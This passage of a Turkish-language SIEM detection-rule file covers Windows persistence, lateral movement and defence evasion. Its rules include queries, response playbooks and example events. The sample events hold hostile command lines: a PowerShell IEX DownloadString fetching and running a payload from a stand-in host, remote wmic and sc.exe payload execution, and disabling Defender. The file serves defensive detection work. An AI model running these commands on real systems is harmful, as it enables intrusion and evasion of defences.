  false_positive_notes: "Yeni donanım sürücü kurulumları veya bazı yazılımların yüklenmesi meşru olarak yeni servis oluşturabilir. Örneğin antivirüs veya VPN istemcileri servis ekler. Ancak sistemde beklenmeyen, rastgele adlandırılmış veya üreticiyle ilişkili olmayan servis isimleri dikkatle incelenmelidir."
  response_playbook:
    - "Servisin adını ve açıklamasını kontrol edin; bilinen bir yazılım veya donanım bileşeniyle ilişkili mi belirleyin."
    - "Servisin yürüttüğü yürütülebilir dosya yolunu bulun (`ImagePath`); dosyayı imza ve VirusTotal gibi kaynaklarla analiz edin."
    - "Eğer servis şüpheli ise, hemen durdurup devre dışı bırakın; ardından ilgili dosyayı karantinaya alın ve sistemden kaldırın."
    - "Aynı zaman diliminde benzer kalıcılık adımları (örn. Run key veya Scheduled Task eklenmesi) var mı kontrol ederek saldırganın kapsamını anlayın."
  references:
    - "MITRE ATT&CK T1543.003: Saldırganlar, sistem açılışında kötü amaçlı payload çalıştırmak için yeni bir servis kurabilir:contentReference[oaicite:17]{index=17}"
    - "MITRE ATT&CK T1569.002: Uzaktan veya lokal, Windows Service Control Manager üzerinden hizmet oluşturularak kod çalıştırılabilir:contentReference[oaicite:18]{index=18}"
  example_event: |
    {
      "@timestamp": "2025-10-03T14:50:00.000Z",
      "winlog.event_id": 7045,
      "event.provider": "Service Control Manager",
      "winlog.event_data.ServiceName": "BackupSecurityService",
      "winlog.event_data.ImagePath": "C:\\Windows\\system32\\bkpsecsvc.exe",
      "user.name": "SYSTEM",
      "host.name": "Server-03"
    }
  short_explanation: "Sistemde 'BackupSecurityService' adında yeni bir servis kuruldu. Alarm sonrasında bu servisin ne olduğunu doğrulayın; eğer meşru bir yazılım kurulumundan gelmiyorsa, servis dosyasını analiz edin ve hizmeti sistemden kaldırın."

- title: "Zamanlanmış Görev oluşturuldu (kalıcılık amaçlı)"
  id: "WIN-012"
  description: "Windows üzerinde yeni bir Zamanlanmış Görev (Scheduled Task) oluşturuldu. Saldırganlar, bu tekniği kötü amaçlı programlarını belirli aralıklarla veya sistem açılışında otomatik çalıştırmak için kullanır. (Ör. Event ID 4698 - 'Yeni zamanlanmış görev oluşturuldu')."
  severity: "medium (Planlanmış görevler sistem yönetiminde kullanılabilir; ancak beklenmedik yeni görevler kalıcılık belirtisi olabileceğinden orta derecede önemlidir.)"
  tags: ["mitre:T1053.005", "kill_chain:Installation"]
  mitre_attack:
    - "T1053.005: Scheduled Task"
  kill_chain_phase: "Installation"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    winlog.event_id: 4698
  detection_query_dsl: >-
    {
      "term": { "winlog.event_id": 4698 }
    }
  threshold_or_rate: "N/A (Her bir görev oluşturma olayı ayrı alarmdır.)"
  false_positive_notes: "Yazılım kurulumları veya sistem yöneticilerinin bakım amaçlı oluşturduğu görevler bu olayı üretebilir. Örneğin bir yazılım güncelleme zamanlaması 4698 eventi oluşturur. Ancak görev adı, yürüttüğü komut ve zamanlaması olağandışıysa (ör. garip isimler, Powershell ile internete bağlanma vb.), bu false positive değildir."
  response_playbook:
    - "Oluşturulan görevin adını ve tetikleme zamanını kontrol edin; beklenen bir ad (ör. \\Microsoft\\Windows\\... altında) mı yoksa rastgele mi."
    - "Görevin çalıştırdığı eylemi inceleyin (örn. komut satırı, betik yolu); zararlı bir payload içerip içermediğini belirlemek için bu komutu analiz edin."
    - "Eğer görev zararlıysa, Görev Zamanlayıcı'dan silin ve tetiklediği dosyayı sistemden kaldırın; ilgili kullanıcı hesabının yetkilerini gözden geçirin."
    - "Ağ genelinde benzer isimde/komutta görevler başka sistemlere de eklenmiş mi, merkezi loglardan veya Elastic aramalarından araştırın."
  references:
    - "MITRE ATT&CK T1053.005: Saldırganlar, Windows Görev Zamanlayıcıyı kötü amaçlı kodu periyodik veya başlangıçta çalıştırmak için kötüye kullanabilir:contentReference[oaicite:19]{index=19}:contentReference[oaicite:20]{index=20}"
  example_event: |
    {
      "@timestamp": "2025-10-03T14:55:00.000Z",
      "winlog.event_id": 4698,
      "winlog.event_data.TaskName": "\\Windows\\Updater\\MaliciousTask",
      "winlog.event_data.TaskContent": "<Actions><Exec><Command>C:\\Windows\\system32\\cmd.exe</Command><Arguments>/c start C:\\Temp\\backdoor.exe</Arguments></Exec></Actions>",
      "user.name": "John.Doe",
      "host.name": "PC-07"
    }
  short_explanation: "Sistemde 'MaliciousTask' adında bir zamanlanmış görev oluşturuldu. Alarmı aldıktan sonra, bu görevin tetiklediği komutu ve zamanlamayı hemen analiz edin; eğer kötü niyetliyse görevi silip ilgili dosyaları temizleyin."

- title: "PowerShell ile harici kaynak indirme (Ingress Tool Transfer)"
  id: "WIN-013"
  description: "PowerShell aracılığıyla harici bir kaynaktan dosya/araç indirme girişimi tespit edildi. Örneğin Invoke-WebRequest, New-Object Net.WebClient DownloadString veya benzeri komutlarla internetten dosya çekiliyor. Bu yöntem, saldırganların zararlı yüklerini doğrudan bellekten indirmesine olanak tanır."
  severity: "high (PowerShell'in internetten dosya indirmesi, genellikle saldırı hazırlığının göstergesi olduğundan kritik önemdedir.)"
  tags: ["mitre:T1105", "kill_chain:Installation"]
  mitre_attack:
    - "T1105: Ingress Tool Transfer"
  kill_chain_phase: "Installation"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    process.name: "powershell.exe" and process.command_line: "*Invoke-WebRequest*"
  detection_query_dsl: >-
    {
      "bool": {
        "must": [
          { "term": { "process.name": "powershell.exe" } },
          { "wildcard": { "process.command_line": "*Invoke-WebRequest*" } }
        ]
      }
    }
  threshold_or_rate: "N/A (Her tespit alarm sayılır.)"
  false_positive_notes: "PowerShell ile internetten indirme, bazı yönetim scriptlerinde görülebilir (ör. yazılım kurulumu için modül indirme). Ancak bu kullanım sınırlı ve genellikle denetim altındadır. Beklenmeyen bir sistemde bu tespit ediliyorsa, çoğunlukla zararlıdır."
  response_playbook:
    - "PowerShell komut satırını tam olarak inceleyin; hangi URL veya IP'den indirme yapılıyor, tespit edin ve URL'yi bloklayın."
    - "İndirilen içeriğin bellekte kalmış olma ihtimaline karşı ilgili PowerShell işleminin bellek dökümünü veya komut çıktısını yakalamaya çalışın."
    - "Aynı URL veya dosya adı, diğer makinelerde de çağrılmış mı Elastic araması yaparak belirleyin (saldırgan ağda yayılım denemiş olabilir)."
    - "İlgili makineyi ağdan izole edin ve dijital adli analiz yapın; zararlı dosya indirilip çalıştırılmışsa, kalıntıları (yazılım, servis, görev) temizleyin."
  references:
    - "MITRE ATT&CK T1105: Saldırganlar uzaktan araç/dosya aktarımı yaparak hedefe kendi araçlarını getirebilir:contentReference[oaicite:21]{index=21}:contentReference[oaicite:22]{index=22}"
    - "MITRE ATT&CK T1105: Windows ortamında certutil veya PowerShell (Invoke-WebRequest gibi) komutları indirme için sık kullanılır:contentReference[oaicite:23]{index=23}"
  example_event: |
    {
      "@timestamp": "2025-10-03T15:00:00.000Z",
      "process.name": "powershell.exe",
      "process.command_line": "powershell -Command IEX(New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')",
      "user.name": "Administrator",
      "host.name": "Server-04"
    }
  short_explanation: "PowerShell komutu, internetten bir içerik indirmeye ve çalıştırmaya çalıştı. Alarmı gördüğünüzde, komut içindeki URL'yi ve indirilen içeriği analiz edin; muhtemel zararlı yükü indirip indirmediğini tespit edin ve gerekiyorsa sistemi izole edin."

- title: "WMI ile uzaktan kod yürütme denemesi (WMIC Process Call)"
  id: "WIN-014"
  description: "Windows WMIC aracı kullanılarak uzak bir sistemde işlem yaratma girişimi tespit edildi. `wmic process call create` komutunun kullanımı, genellikle saldırganların etki alanı içinde yayılmak veya uzak sistemlerde komut çalıştırmak için başvurduğu bir Yanal Hareket tekniğidir."
  severity: "high (WMI üzerinden uzak kod yürütme, saldırganın ağ içinde hareket ettiğini gösterdiğinden kritik önemdedir.)"
  tags: ["mitre:T1047", "kill_chain:ActionsOnObjectives"]
  mitre_attack:
    - "T1047: Windows Management Instrumentation"
  kill_chain_phase: "ActionsOnObjectives"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    process.command_line: "*wmic*process call create*"
  detection_query_dsl: >-
    {
      "wildcard": { "process.command_line": "*wmic*process call create *" }
    }
  threshold_or_rate: "N/A (Tek seferlik tespit alarm oluşturur.)"
  false_positive_notes: "WMIC ile uzaktan süreç oluşturma, tipik BT yönetiminde çok nadir kullanılır. Genellikle saldırı simülasyonu ya da yayılma testleri dışında görülmez. Bu nedenle, bu etkinlik hemen her zaman kötü niyetlidir."
  response_playbook:
    - "WMIC komutunu çalıştıran sistemi ve kullanıcıyı belirleyin; bu kullanıcı ve sistem compromise olmuş olabilir, derhal inceleyin."
    - "Hedef alınan uzak makineye bağlanarak, `wmic` komutuyla ne çalıştırılmaya çalışıldığını loglardan (Security log 4688 veya Sysmon Event 1) tespit edin."
    - "İlgili kaynak ve hedef sistemlerde, aynı zaman diliminde başka WMI etkinlikleri (Event ID 5861 veya Sysmon Event 10) var mı araştırın."
    - "Ağ seviyesinde, RPC üzerinden WMI isteklerini izleyip engellemek için kural uygulayın (özellikle beklenmeyen sistemler arası 135/tcp trafiği için alarm oluşturun)."
  references:
    - "MITRE ATT&CK T1047: WMI ile uzaktan süreç başlatma mümkündür; örneğin `wmic /node:<hedef> process call create <komut>` ile hedefte kod çalıştırılabilir:contentReference[oaicite:24]{index=24}"
    - "Splunk araştırması: `wmic process call create` kullanımını tespit etmek, uzaktan WMI saldırılarını yakalamada kritik bir yöntemdir:contentReference[oaicite:25]{index=25}:contentReference[oaicite:26]{index=26}"
  example_event: |
    {
      "@timestamp": "2025-10-03T15:05:00.000Z",
      "process.name": "wmic.exe",
      "process.command_line": "wmic /node:\"PC-Target\" process call create \"powershell -ExecutionPolicy Bypass -File \\\\Server\\share\\payload.ps1\"",
      "user.domain": "CORP",
      "user.name": "hacker",
      "host.name": "PC-08"
    }
  short_explanation: "WMIC aracı kullanılarak 'PC-Target' isimli uzak sisteme komut gönderildi (process call create ile). Alarm sonrası, komutu gönderen sistemi ve hedef sistemi detaylı inceleyin; genellikle bu, saldırganın ağ içinde WMI ile lateral hareket yaptığını gösterir."

- title: "SC.exe ile uzaktan servis oluşturma (Lateral Movement)"
  id: "WIN-015"
  description: "Windows Service Control (sc.exe) komutu kullanılarak uzak bir makinede servis oluşturma veya mevcut servisi manipüle etme girişimi tespit edildi. Saldırganlar, `sc \\\\<hedef> create/start` gibi komutlarla ağ içindeki diğer sistemlere zararlı servisler yükleyerek yatay hareket gerçekleştirir."
  severity: "high (Uzak bir sistemde servis oluşturma, saldırganın ağ içerisinde yayılmaya çalıştığını gösterdiğinden kritik kabul edilir.)"
  tags: ["mitre:T1569.002", "kill_chain:ActionsOnObjectives"]
  mitre_attack:
    - "T1569.002: Service Execution"
  kill_chain_phase: "ActionsOnObjectives"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    process.name: "sc.exe" and process.command_line: "*\\\\*"
  detection_query_dsl: >-
    {
      "bool": {
        "must": [
          { "term": { "process.name": "sc.exe" } },
          { "wildcard": { "process.command_line": "*\\\\*" } }
        ]
      }
    }
  threshold_or_rate: "N/A (Her komut tespiti alarmdır.)"
  false_positive_notes: "Sistem yöneticileri bazen uzaktan hizmet yönetimi için sc.exe kullanabilir, ancak bu genelde merkezi yönetim araçlarıyla yapılır. Tek tek sc.exe komutlarının elle kullanımı nadirdir. Bu yüzden bu tespit çoğunlukla kötü amaçlıdır, özellikle hedef olarak istemci sistemler varsa."
  response_playbook:
    - "Komutu çalıştıran kullanıcıyı ve kaynağı (hangi makineden) belirleyin; bu kaynak makine muhtemelen ele geçirilmiştir, derhal analiz edin."
    - "Hedef makine üzerinde yeni bir servis oluşturulmuşsa, servis adını ve çalıştırdığı exe dosyasını bulun; zararlıysa servisi durdurup silin ve dosyayı kaldırın."
    - "SC.exe komutunun tam parametrelerini logdan inceleyin (örneğin, 'sc \\\\HOST create <...>' içinde geçen dosya yolunu ve servis adını not edin)."
    - "Active Directory ortamında, ilgili hesabın o hedef makineye erişim yetkileri olup olmadığını denetleyin; gerekirse hesabı devre dışı bırakın ve parolasını değiştirin."
  references:
    - "MITRE ATT&CK T1569.002: Windows Service Control Manager (services.exe) üzerinden uzak sistemlerde komut icrası yapılabilir; sc.exe bu amaçla kullanılabilir:contentReference[oaicite:27]{index=27}"
    - "MITRE ATT&CK T1569.002: PsExec gibi araçlar da geçici servis oluşturarak uzaktan payload çalıştırır, sc.exe de benzer şekilde remote parametreyle kullanılabilir:contentReference[oaicite:28]{index=28}"
  example_event: |
    {
      "@timestamp": "2025-10-03T15:10:00.000Z",
      "process.name": "sc.exe",
      "process.command_line": "sc \\\\CORP-FILESVC create MalService binPath= C:\\Windows\\Temp\\malicious.exe start= auto",
      "user.name": "CORP\\admin_jane",
      "host.name": "Admin-PC"
    }
  short_explanation: "Bir yönetici aracı (sc.exe) kullanılarak uzak bir makinede 'MalService' adlı bir servis yaratılmaya çalışıldı. Bu alarmı inceleyerek, komutu yollayan sistemi (Admin-PC) ve hedef sistemi derhal tetkik edin; genellikle bu, saldırganın ağda lateral movement yaptığını gösterir."

- title: "Windows güvenlik logları temizlendi"
  id: "WIN-016"
  description: "Windows Olay Günlükleri'nin (özellikle Güvenlik günlüğü) temizlendiği tespit edildi. Güvenlik logunun silinmesi (Event ID 1102) genellikle izlerini gizlemeye çalışan bir saldırganın eylemidir. Bu işlem, sistemdeki önceki güvenlik olaylarının kaybolmasına neden olur."
  severity: "high (Bir saldırganın izlerini örtbas etmek için logları sildiğini gösterdiğinden kritik önemdedir.)"
  tags: ["mitre:T1070.001", "kill_chain:ActionsOnObjectives"]
  mitre_attack:
    - "T1070.001: Indicator Removal on Host: Clear Windows Event Logs"
  kill_chain_phase: "ActionsOnObjectives"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    winlog.event_id: 1102
  detection_query_dsl: >-
    {
      "term": { "winlog.event_id": 1102 }
    }
  threshold_or_rate: "N/A (Log temizleme olayı tek başına kritiktir.)"
  false_positive_notes: "Olay günlüklerinin temizlenmesi normal operasyonlarda yapılmaz. Yalnızca nadir durumlarda yönetici hatalarıyla loglar silinebilir (örneğin disk doluluk müdahalesi), fakat bu bile çok sıra dışıdır. Dolayısıyla 1102 olayı hemen her zaman bir saldırı göstergesidir."
  response_playbook:
    - "Hangi kullanıcı veya süreç tarafından logların silindiğini Windows Güvenlik loglarından (Event 1102'nin kendi kayıt detayında Subject User) öğrenin; ilgili hesabı derhal kilitleyin."
    - "Merkezi log sunucunuz varsa, bu makineye ait geçmiş logları oradan analiz edin; saldırganın log silmeden önceki aktivitelerini (ör. hangi araçlar çalışmış) ortaya çıkarmaya çalışın."
    - "Etkilenen sistemi ağdan izole edin ve adli analiz için bellek/disk görüntüsü alın; logların silinmesi, öncesinde gerçekleşen saldırı adımlarını gizlemeye yönelik olduğundan derin inceleme yapın."
    - "Saldırı izlerini restore etmek zor olabileceğinden, gelecekteki benzer durumlar için Event Forwarding veya SIEM entegrasyonu ile logları anlık olarak merkezi bir yere kopyalamanız önerilir."
  references:
    - "MITRE ATT&CK T1070.001: Saldırganlar izlerini gizlemek için Windows olay günlüklerini (Security, System) temizleyebilir:contentReference[oaicite:29]{index=29}"
    - "Windows 1102 olayı: Güvenlik denetim günlüğü temizlendi; bu genellikle bir saldırganın logları silmeye karar verdiği kritik bir andır:contentReference[oaicite:30]{index=30}:contentReference[oaicite:31]{index=31}"
  example_event: |
    {
      "@timestamp": "2025-10-03T15:15:00.000Z",
      "winlog.event_id": 1102,
      "winlog.channel": "Security",
      "user.name": "MACHINE$",
      "host.name": "PC-09",
      "event.action": "Audit Log Cleared"
    }
  short_explanation: "Bir sistemde Windows Güvenlik logları temizlendi (Event ID 1102). Bu alarm geldiğinde, ilgili makinenin potansiyel olarak kompromize olduğunu varsayın; logları merkezi kayıtlardan inceleyip saldırgan aktivitelerini ortaya çıkarmaya odaklanın."

- title: "Windows Defender devre dışı bırakıldı veya ayarları değiştirildi"
  id: "WIN-017"
  description: "Windows Defender veya benzeri güvenlik aracının ayarlarının saldırgan tarafından devre dışı bırakılmaya çalışıldığı tespit edildi. Örneğin, `Set-MpPreference -DisableRealtimeMonitoring` komutu çalıştırılmış veya kayıt defterinde antivirüs kapatma anahtarları değişmiş olabilir. Bu davranış, saldırganın tespit edilmekten kaçınmak için savunmaları etkisiz hale getirme girişimidir."
  severity: "high (Saldırgan sistemdeki güvenlik yazılımlarını devre dışı bırakmaya çalıştığı için kritik önemdedir.)"
  tags: ["mitre:T1562.001", "kill_chain:Installation"]
  mitre_attack:
    - "T1562.001: Disable or Modify Tools"
  kill_chain_phase: "Installation"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    process.command_line: "*DisableRealtimeMonitoring*"
  detection_query_dsl: >-
    {
      "wildcard": { "process.command_line": "*DisableRealtimeMonitoring*" }
    }
  threshold_or_rate: "N/A (Tekil tespit alarm için yeterlidir.)"
  false_positive_notes: "Gerçek zamanlı korumayı devre dışı bırakmak, ancak bazı özel durumlarda sistem yöneticisi tarafından geçici olarak yapılabilir (ör. sorun giderme). Ancak bu son derece nadirdir ve kurumsal politikalarla genelde sınırlanır. Dolayısıyla bu etkinlik hemen her zaman şüphelidir."
  response_playbook:
    - "Defender kapatma komutunu kim çalıştırmış tespit edin (kullanıcı hesabı ve süreç); ilgili hesabın yetkilerini ve faaliyetlerini hemen denetleyin."
    - "Sistemdeki antivirüs durumu kontrol edin; eğer kapalıysa derhal yeniden etkinleştirin ve güncel tarama yapın. Başka güvenlik ayarları da değişmiş mi (örn. güvenlik duvarı) inceleyin."
    - "Etkilenen makineye olası zararlı yazılım bulaşmış olabileceği için tam tarama dışında, bellek analiz araçlarıyla kötü niyetli işlemler arayın."
    - "Saldırganın bu adımı atmış olması, sonraki zararlı aktivitelerini gizlemek içindir; bu nedenle sistemin kapsamlı adli analizini planlayın ve aynı ağ segmentindeki diğer makinelerde benzer girişimler (Defender uyarıları kapatılması gibi) olmuş mu kontrol edin."
  references:
    - "MITRE ATT&CK T1562.001: Saldırganlar, güvenlik yazılımlarını devre dışı bırakarak araçlarının tespit edilmesini engellemeye çalışabilir (örn. AV süreçlerini sonlandırma, ayarları değiştirme):contentReference[oaicite:32]{index=32}"
    - "MITRE ATT&CK T1562.001: Örneğin, saldırganlar Windows Defender'ı kapatmak için kayıt defteri veya PowerShell komutları kullanabilir; bu savunma zayıflatma tekniğinin bir parçasıdır:contentReference[oaicite:33]{index=33}"
  example_event: |
    {
      "@timestamp": "2025-10-03T15:20:00.000Z",
      "process.name": "powershell.exe",
      "process.command_line": "powershell Set-MpPreference -DisableRealtimeMonitoring 1",
      "user.name": "CORP\\itadmin",
      "host.name": "PC-10"
    }
  short_explanation: "Bir komut, Windows Defender gerçek zamanlı korumasını devre dışı bırakmaya çalıştı. Alarm alındığında, bu işlemi başlatan kullanıcıyı ve sistemi hemen inceleyin; güvenlik yazılımlarını tekrar etkinleştirin ve saldırganın izlerini arayın."

